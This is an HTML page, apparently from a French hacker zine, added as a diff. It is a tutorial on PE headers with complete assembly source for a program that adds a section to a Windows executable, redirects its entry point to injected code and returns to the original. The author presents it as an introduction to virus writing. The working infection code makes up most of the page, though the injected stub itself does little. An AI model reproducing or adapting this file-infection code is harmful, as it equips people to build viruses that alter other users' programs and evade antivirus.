@@ -1,0 +1,450 @@
+<html>
+<head>
+<title>PROGRAMMATION</title>
+</head>
+<body bgcolor=#000000>
+<center>
+</font>
+<pre>
+<font size=2 color=#ffff00>
+******************************************************************************
+{{{{{{{{{{{{{{{{{{{{{{{{{{  PLAY WITH THE PE HEADER  }}}}}}}}}}}}}}}}}}}}}}}}}
+******************************************************************************
+</center></font></pre><font size=3 color=#ffffff>
+<br>
+Le but est de créer un prog qui en modifie un autre (c'est un genre
+d'intro à la programmation de virus quoi). Le programme va en fait
+rajouter un section dans un autre. Il modifiera l'EntryPoint (point
+de départ du programme) pour pointer sur cette section.
+Lors de l'éxécution du programme modifié le code placé dans cette
+section sera executé puis le programme reviendra à son EntryPoint
+original.<br><br>
+
+Le prog va créer une section qui sera pointé par l'Entry Point.
+Cette section doit être de type E0000020. (read/write/exe...).
+Pour créer une nouvelle section, on agrandit tout d'abord le nombre
+de celles ci dans le PE Header (ajoute 1 à la valeur).On lui donne
+ensuite un nom. Puis viennent les modifications sur le fichier. On
+cherche l'adresse de notre nouvelle section :
+<font size=3 color=#0000FF>
+<pre>
+RAW OFFSET = (RAW OFFSET derniere_section)+ (RAW SIZE derniere_section)
+</font></pre>
+puis toutes ses caractéristiques:
+<font size=3 color=#0000FF>
+<pre>
+VIRTUAL OFFSET = (VIRTUAL OFFSET derniere_section)+ (RAW SIZE derniere_section)
+RAW SIZE = 1000h    (notre section fait 4096 bytes)
+VIRTUAL SIZE = 1000h (bah idem koi)
+</font></pre>
+Le RAW SIZE de notre section sera de 1000 en hexadécimal c'est à dire 4096
+en décimal. Il faudra donc augmenter la 'Size Of Image' de la même valeur.<br><br>
+
+Pour faire tout ceci il faut connaître la structure d'un programme éxécutable
+win32. Un EXE est composé d'un MZ Header qui contient en (+6) l'adresse du début
+du PE Header (dans un DWORD). Ce dernier est formé ainsi:
+<font size=3 color=#00FF00>
+<pre>
+Le PE Header:
+------------------------
+
+WORD   Machine Type
+WORD   Nombre de Sections
+DWORD  Time/Date
+DWORD  Pointeur vers la table des Symboles
+DWORD  Nombre de Symboles
+WORD   Taille de l'Optional Header
+WORD   Caracteristiques 
+WORD   Magic
+BYTE   MajorLinkerVersion
+BYTE   MinorLinkerVersion
+DWORD  SizeOfCode
+DWORD  SizeOfInitializedData
+DWORD  SizeOfUninitializedData
+DWORD  AddressOfEntryPoint
+DWORD  BaseOfCode
+DWORD  BaseOfData
+DWORD  ImageBase
+DWORD  SectionAlignment
+DWORD  FileAlignment
+WORD   MajorOperatingSystemVersion
+WORD   MinorOperatingSystemVersion
+WORD   MajorImageVersion
+WORD   MinorImageVersion
+WORD   MajorSubsystemVersion
+WORD   MinorSubsystemVersion
+DWORD  Win32VersionValue
+DWORD  SizeOfImage
+DWORD  SizeOfHeaders
+DWORD  CheckSum
+WORD   Subsystem
+WORD   DllCharacteristics
+DWORD  SizeOfStackReserve
+DWORD  SizeOfStackCommit
+DWORD  SizeOfHeapReserve
+DWORD  SizeOfHeapCommit
+DWORD  LoaderFlags    
+</font></pre>
+248 Bytes après le PE Header on a les caractéristiques des sections :
+<font size=3 color=#00FF00>
+<pre>
+BYTE   Name  (taille = 6 bytes)
+DWORD  PhysicalAddress
+DWORD VirtualSize
+DWORD  VirtualAddress
+DWORD  SizeOfRawData
+DWORD  PointerToRawData
+DWORD  PointerToRelocations
+DWORD  PointerToLinenumbers
+WORD   NumberOfRelocations
+WORD   NumberOfLinenumbers 
+DWORD  Caracteristiques 
+</font></pre>
+
+Avec tout ceci on a de quoi faire pas mal de choses :)<br>
+Une grande partie du proramme se charge donc de créer une nouvelle section
+en écrivant toutes ces caractéristiques.<br><br>
+
+Je suis navré de ne pas pouvoir tout expliquer ici, mais il faut un 
+minimum de connaissance en Asm pour comprendre. Donc allez voir le tut
+sur la programmation Asm dans ce même zine.<br><br>
+
+Voici le source (il modifie un programme exemple.exe placé dans le même
+répertoire que lui).<br><br>
+<font size=3 color=#0000FF>
+<pre>
+Pour compiler:
+tasm32 -ml -m5 -q glop.asm
+tlink32 -Tpe -aa -x -c glop.obj ,,,import32
+</font></pre>
+<font size=3 color=#FF0000>
+<pre>
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;
+;MessageBoxBinder par TiPiaX - Hackerstorm
+;TiPiaX@hackerstorm.com
+;
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;Le Programme écrivant dans les sections de code, vous devez
+;modifier toutes les sections du programme en E0000020
+;(read / write / executable)
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+.586P
+JUMPS
+LOCALS
+.MODEL FLAT , STDCALL
+
+
+NULL             equ    0
+FILE_BEGIN       equ    0
+GENERIC_WRITE    equ    40000000h
+GENERIC_READ     equ    80000000h
+OPEN_EXISTING    equ    3
+
+LMEM_FIXED       equ    0
+LMEM_ZEROINIT    equ    40h
+LPTR             equ    LMEM_FIXED + LMEM_ZEROINIT
+
+.DATA
+
+;----------------------------------------------------------------------
+
+message  db '!!! MessageBox Binder par TiPiaX !!!',0
+error    db 'CreateFile Failed',0
+Werror   db 'WriteFile Failed',0
+mzerror  db 'Ce fichier n est pas un éxécutable valide',0
+mz       db 'MZ header détecté :)',0
+pe       db 'PE header détecté :)',0
+titre    db 'HackerStorm',0
+pathexe  db 'exemple.exe',0
+oki      db 'Hack du fichier effectué - Fuck OFF',0
+
+handle   dd 0
+size     dd 0
+byteread dw ?
+
+
+RAWOFFSETds      dd ?
+RAWSIZEds        dd ?
+VIRTUALSIZEds    dd ?
+VIRTUALOFFSETds  dd ?
+RAWOFFSET        dd ?
+VIRTUALOFFSET    dd ?
+ENTRYPOINT       dd ?
+IMAGEBASE        dd ?
+TAILLE           equ (offset copyend-offset copy)
+
+
+;----------------------------------------------------------------------
+
+.CODE
+
+;----------------------------------------------------------------------
+
+START:
+
+   EXTRN SetFilePointer:PROC
+
+   EXTRN ExitProcess:PROC
+   EXTRN CreateFileA:PROC
+   EXTRN GetFileSize:PROC
+   EXTRN LocalAlloc:PROC
+   EXTRN WriteFile:PROC
+   EXTRN ReadFile:PROC
+   EXTRN MessageBoxA:PROC
+
+   call MessageBoxA, NULL, offset message, offset titre, NULL
+
+   call CreateFileA,offset pathexe,GENERIC_READ+GENERIC_WRITE, 				
+		 NULL,NULL,OPEN_EXISTING,NULL,NULL
+   cmp eax, -1
+   je erreur
+
+   mov  handle, eax
+   call GetFileSize, eax ,0
+   add eax, 1000h
+   mov  size, eax
+
+;----------------------------------------------------------------------
+;---Alloue un espace memoire et inscrit le fichier dedans--------------
+;----------------------------------------------------------------------
+
+   call LocalAlloc, LPTR, eax
+   mov 	edi,eax
+
+   call ReadFile , handle , edi, size, offset byteread, NULL  ;lecture du fichier
+
+;----------------------------------------------------------------------
+;---cherche la présence d'un MZ Header puis PE Header------------------
+;----------------------------------------------------------------------
+
+   cmp  word ptr [edi],'ZM'                 ; verification s'il s'agit bien d'un EXE
+   jne  mzerreur
+
+   call MessageBoxA, NULL, offset mz, offset titre, NULL
+
+   mov ebx, dword ptr [edi+3Ch]             ;adresse de l'adresse du PE Header
+   add ebx, edi                             ;ebx pointe sur le PE Header
+   cmp dword ptr[ebx], 'EP'                 ;verification s'il s'agit bien d'un PE Executable
+   jne eperreur
+
+   call MessageBoxA, NULL, offset pe, offset titre, NULL
+
+
+;----------------------------------------------------------------------
+;--MODIFICATION DU FICHIER COPIE EN MEMOIRE----------------------------
+;----------------------------------------------------------------------
+
+   mov ecx, ebx                             ;sauvegarde de l'adresse du PE dans
+                                            ;ECX !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+   movzx edx, word ptr [ebx+6]              ;edx = nb de sections
+   add word ptr [ebx+6] , 1                 ;ajoute une section
+
+   mov eax, dword ptr [ebx+40]              ;ancien EntryPoint
+   mov AENTRYPOINT, eax
+
+   mov eax, dword ptr [ebx+52]              ;l'image base en eax
+   mov IMAGEBASE, eax
+   add dword ptr [ebx+80], 4096             ;size of image + 1000h.
+
+   add ebx , 248                            ;ebx pointe le section header
+
+;----------------------------------------------------------------------
+;Ici on veut atteindre la fin de la derniere section dans le section
+;header pour donner un nom à notre nouvelle section. Or une section
+;fait 40 bytes. Il faut donc se déplacer de 40 * (nb de section).
+;----------------------------------------------------------------------
+
+   imul edx, 40                             ;nb de section * 40
+   add ebx, edx                             ;ebx pointe après les sections!!!!!!!!!!!
+   mov dword ptr [ebx], 'PiT.'              ;ecrit le nom
+
+
+   mov eax, dword ptr [ebx-20]           ;RAWOFFSETds  = RawOffset de la derniere section
+   mov RAWOFFSETds , eax
+   mov eax, dword ptr [ebx-24]           ;RAWSIZEds = RawSize de la derniere section
+   mov RAWSIZEds , eax
+   mov eax, dword ptr [ebx-28]          ;VIRTUALOFFSETds = VirtualSize de la derniere section
+   mov VIRTUALOFFSETds, eax
+   mov eax, dword ptr [ebx-32]          ;VIRTUALSIZEds = VirtualOffset de la derniere section
+   mov VIRTUALSIZEds, eax
+
+;calcul du RAWOFFSET:
+;---------------------
+   push edi
+   push ecx
+   mov ecx,RAWOFFSETds
+   mov edi,RAWSIZEds
+   add ecx,edi
+   mov RAWOFFSET, ecx
+   pop ecx
+   pop edi
+
+;calcul du VIRTUALOFFSET:
+;------------------------
+   push edi
+   push ecx
+   mov ecx,VIRTUALOFFSETds
+   mov edi,RAWSIZEds
+   add ecx,edi
+   mov VIRTUALOFFSET, ecx
+   pop ecx
+   pop edi
+
+;ecrit les caractéristiques
+;---------------------------
+
+   mov eax,RAWOFFSET
+   mov dword ptr [ebx+20], eax              ;le raw offset
+   mov eax,VIRTUALOFFSET
+   mov dword ptr [ebx+12], eax              ;le virtual offset
+
+   or  dword ptr [ebx+36], 0E0000020h       ;Characterics
+   mov eax,4096
+   mov dword ptr [ebx+16], eax              ;raw size
+   mov dword ptr [ebx+8] , eax              ;virtual size
+
+;calcul de l'ENTRYPOINT:
+;------------------------
+
+   mov eax,VIRTUALOFFSET
+   mov ENTRYPOINT, eax                      ;nouvel EntryPoint = VirtualOffset
+
+
+   mov dword ptr [ecx+40] ,eax              ;écrit le nouvel EntryPoint
+
+;----------------------------------------------------------------------
+;copie du code (ça ressemble grave a un virus)
+;----------------------------------------------------------------------
+
+   mov ebx, edi                             ;ebx pointe sur le debut du fichier
+   mov eax, RAWOFFSET
+   add ebx, eax                           ;ebx pointe la ou on ecrit le code de notre section
+
+;calcul du saut de retour
+
+   mov eax, AENTRYPOINT
+   mov ecx, IMAGEBASE
+   add eax, ecx
+   mov AENTRYPOINT, eax
+
+   push edi
+   mov edi,ebx                              ;edi = adresse du shellcode :)
+   lea esi, copy                            ;bytes a copier
+   mov ecx, TAILLE                          ;taille a copier
+   rep movsb                                ;copie le code dans le fichier victime
+   pop edi
+
+   jmp copyend
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+;le code copié
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+copy:     ;le prog victime demarre : EntryPoint en eax
+
+;calcul du delta offset : ebp = decalage
+
+   mov ebx, offset copy
+   sub eax, ebx
+   mov ebp, eax
+
+   nop
+   nop
+   lea edi, [hello+ebp]
+   push 0
+   push edi
+   push edi
+   push 0
+   ;call MessageBoxA (héhé il faudrait pour cela qu'on sache localiser kernel32.dll
+                     ;ce sera donc l'objet d'un prochain tut :)
+
+   mov eax, [AENTRYPOINT+ebp]
+   jmp eax
+
+   hello db "hi world",0
+   AENTRYPOINT dd 0
+
+copyend:
+
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+; fin du code copié
+;¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
+
+;----------------------------------------------------------------------
+;--Réécrit le buffer modifié dans le fichier---------------------------
+;----------------------------------------------------------------------
+
+   call SetFilePointer, handle, 0, 0, FILE_BEGIN    ;car ReadFile met le pointeur à la fin
+		
+   call WriteFile , handle, edi, size, offset byteread, NULL  ;ecrit les modifications
+   cmp eax, 00
+   je Werreur
+
+   call MessageBoxA, NULL, offset oki, offset titre, NULL
+
+   jmp fin
+
+;----------------------------------------------------------------------
+;-----Messages d'erreurs-----------------------------------------------
+;----------------------------------------------------------------------
+
+Werreur:
+   call MessageBoxA, NULL, offset Werror, offset titre, NULL
+   jmp fin
+
+erreur:
+   call MessageBoxA, NULL, offset error, offset titre, NULL
+   jmp fin
+
+eperreur:
+mzerreur:
+   call MessageBoxA, NULL, offset mzerror, offset titre, NULL
+
+fin:
+
+   call ExitProcess, NULL
+
+END START
+;----------------------------------------------------------------------
+
+</font></pre>
+Je ne pensais pas au départ faire un programme qui ressemble à ce point à
+un virus, mais apparement AVP dit quand même que le fichier est clean :-)))
+en fait le programme après avoir ajouté la section et mis l'EntryPoint à
+la bonne valeur, va au début de la section.<br>
+Arrivé ici, il copie le code compris entre copy et copyend.
+C'est pour pouvoir copier les valeurs de L'ancien EntryPoint que cette
+variable est déclarée à l'intérieur du code. Une autre chose assez
+difficle à comprendre (si vous n'êtes pas programmeur de virii) est le calcul
+du delta offset. En fait ce calcul permet de connaitre le décalage entre
+l'endroit où on a placé notre code et le début normal du programme. Pour faire
+ceci on peut faire un call puis un pop (méthode utilisée dans mes virus infecteurs
+de .com). ceci a pour effet de nous donner l'adresse dans le registre qui a servit
+au pop. Mais ici on prend la valeur de eax qui correspond à l'entrypoint et on
+lui soustrait l'adresse (en raw) de debut de notre code à copier.
+Ainsi on peut declarer des chaines de caractères réutilisables etc...
+Le programme tel qui se présente ne fait qu'une seule chose sur l'exe
+contaminé (putain je me crois vraiment dans un virus ;) il rajoute un détour.
+C'est a dire que le programme lancé va sur notre code et notre code renvoie
+à l'entrypoint original.<br>
+Vous pouver voir que j'ai ajouté une ébauche d'appel de l'API MessageBoxA,
+cependant pour pouvoir appeler les APIs il faudrait une trentaines de lignes
+de code en plus et je pense qu'il n'y a pas besoin de cela en plus pour vous
+embrouiller. Faut y aller par stade, donc ce sera pour la partie virus du zine.
+Sinon dites vous que c'est un exercice et essayez d'y arriver :)<br><br>
+
+A part cela je pense que le code est suffisament commenté mais n'hésitez pas
+à me mailer en cas de problème.<br>
+
+<font size=3 color=#ffff00><br><br>
+<center>
+<pre>TiPiaX/VDS</pre>
+<br>
+</font></body></html>
+
+
